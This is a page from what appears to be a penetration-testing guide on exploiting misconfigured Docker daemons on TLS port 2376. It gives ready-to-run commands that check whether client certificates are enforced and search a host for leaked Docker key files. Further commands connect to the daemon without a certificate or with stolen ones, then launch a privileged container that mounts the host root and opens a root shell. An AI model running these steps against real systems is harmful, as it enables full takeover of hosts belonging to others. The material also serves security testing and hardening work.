---
title: "Weak TLS on 2376: reaching the daemon despite transport security"
order: 3
description: "Port 2376 is meant to protect the Docker API with mutual TLS, but it is often misconfigured: TLS verification disabled, client-certificate authentication not enforced, or private keys left readable. Where any of these holds, an attacker reaches the same root-equivalent daemon API that 2375 exposes, just over an encrypted channel."
keywords:
  - docker 2376
  - docker tls
  - mutual tls
  - tlsverify
  - host takeover
---

# Weak TLS on 2376

Port 2376 is the Docker daemon's TLS endpoint, intended to be protected by mutual TLS: the server presents a certificate, and it should require clients to present a certificate signed by a trusted CA (`--tlsverify`). The protection fails in several common ways: the daemon is started with `--tls` but not `--tlsverify`, so any client connects without a certificate; the CA trusts certificates too broadly; or the client key and certificate are left world-readable on a host the attacker already partly controls. In each case the attacker reaches the same root-equivalent API as an open 2375, merely over TLS.

Probe the TLS posture:

```bash
# Is client-certificate auth actually enforced?
curl -sk https://<target>:2376/version                # a version response without a client cert => not enforced
openssl s_client -connect <target>:2376 </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer
# If client certs are required, look for leaked key material
find / -name 'key.pem' -o -name 'cert.pem' -o -name 'ca.pem' 2>/dev/null | grep -i docker
```

## Routes

```bash
# 1. tlsverify not enforced: connect with TLS but no client cert
export DOCKER_HOST=tcp://<target>:2376 DOCKER_TLS=1
docker --tls -H tcp://<target>:2376 info

# 2. Leaked client certs: use them to authenticate as a trusted client
docker --tlsverify --tlscert=cert.pem --tlskey=key.pem --tlscacert=ca.pem \
  -H tcp://<target>:2376 run -v /:/host --privileged --rm -it alpine chroot /host sh
```

Once connected, the host-takeover step is identical to the unauthenticated case: a privileged container that mounts the host root.

## Exploitation notes

- The key question is whether the server enforces client certificates, not whether TLS is present; a `version` reply to a request with no client certificate proves it does not, and the daemon is as exposed as a 2375.
- Leaked `cert.pem`/`key.pem` pairs are common on CI runners, orchestration hosts, and developer machines that manage a remote daemon; a readable pair authenticates you as a trusted client.
- After connecting, proceed exactly as in [Unauthenticated daemon access](unauthenticated-daemon-access.md) and [Host takeover via privileged run](host-takeover-via-privileged-run.md).

## References

- [Docker: protect the daemon socket with TLS](https://docs.docker.com/engine/security/protect-access/)
- [HackTricks: 2376 Docker TLS](https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker)
